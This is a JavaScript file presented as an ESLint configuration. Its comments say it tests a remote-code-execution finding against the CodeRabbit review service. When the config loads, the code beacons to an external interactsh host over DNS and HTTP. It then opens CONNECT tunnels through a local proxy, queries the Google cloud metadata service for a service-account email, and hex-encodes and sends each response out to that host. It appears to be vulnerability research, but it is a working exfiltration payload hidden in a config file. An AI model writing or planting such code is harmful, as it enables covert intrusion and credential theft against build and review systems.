// CodeRabbit RCE — DEFINITIVE proxy-CONNECT tunnel test.
// Tunnel to OUR OWN listener (C) over CONNECT and beacon a unique path through it.
// If our listener logs that HTTP request from the proxy's egress IP, the tunnel is REAL
// and forwards plaintext to arbitrary host:port (a true SSRF pivot). Then metadata is re-tested.
var C = 'd8spg7joeaqnsnnvt2s0gbtgar71czn48.oast.live';
var http = require('http'), dns = require('dns'), net = require('net');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1500), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive12.' + C, function () {}); } catch (e) {}

// CONNECT host:port via proxy, then write `req` raw; exfil any response.
var tunnel = function (host, port, req, tag, holdMs) {
  try {
    var s = net.connect({ host: '127.0.0.1', port: 1080, timeout: 12000 });
    var hdr = '', tun = false, resp = '', done = false;
    var flush = function (p) { if (done) return; done = true; httpX(tag, (p || '') + (resp || hdr || '').slice(0, 700)); try { s.destroy(); } catch (e) {} };
    s.on('connect', function () { s.write('CONNECT ' + host + ':' + port + ' HTTP/1.1\r\nHost: ' + host + ':' + port + '\r\n\r\n'); });
    s.on('data', function (d) {
      var str = d.toString('latin1');
      if (!tun) { hdr += str; if (/\r\n\r\n/.test(hdr)) { tun = true; if (/ 200/.test(hdr.split('\r\n')[0])) { var ex = hdr.split('\r\n\r\n').slice(1).join('\r\n\r\n'); resp += ex; s.write(req); } else { flush('NOTUNNEL:'); } } }
      else { resp += str; if (resp.length > 200) flush('RESP:'); }
    });
    s.on('end', function () { flush('END:'); });
    s.on('close', function () { flush('CLOSE:'); });
    s.on('error', function (e) { if (!done) { done = true; httpX(tag, 'ERR:' + ((e && e.code) || e)); } });
    s.on('timeout', function () { flush('TO:'); });
  } catch (e) { httpX(tag, 'EXC'); }
};

// TEST A — tunnel to OUR listener: the marker arriving at interactsh proves a real plaintext tunnel.
tunnel(C, 80, 'GET /TUNNEL_PROOF_marker HTTP/1.1\r\nHost: ' + C + '\r\nConnection: close\r\n\r\n', 'tunext', 3000);
// TEST B — tunnel to metadata:80 (patient capture)
tunnel('169.254.169.254', 80, 'GET /computeMetadata/v1/instance/service-accounts/default/email HTTP/1.1\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n', 'mdemail', 5000);
// TEST C — raw TCP banner from proxy localhost:1080 itself (what is it?)
tunnel('127.0.0.1', 1080, 'GET / HTTP/1.0\r\n\r\n', 'self1080', 3000);

module.exports = { root: true, rules: {} };
